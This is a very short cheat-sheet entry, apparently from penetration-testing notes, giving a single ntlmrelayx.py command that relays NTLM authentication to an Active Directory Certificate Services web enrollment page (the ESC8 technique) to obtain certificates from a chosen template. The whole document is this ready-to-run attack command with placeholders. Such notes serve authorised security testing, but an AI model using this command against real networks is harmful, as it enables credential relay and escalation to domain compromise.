# NTLMRelayX

## Relay to ADCS (ESC8)

```
sudo env PATH="$PATH" ntlmrelayx.py --adcs --template "<template>" -ip 127.0.0.1 -debug -dh -smb2support -t http://<adcs_ip>/certsrv/certfnsh.asp
```
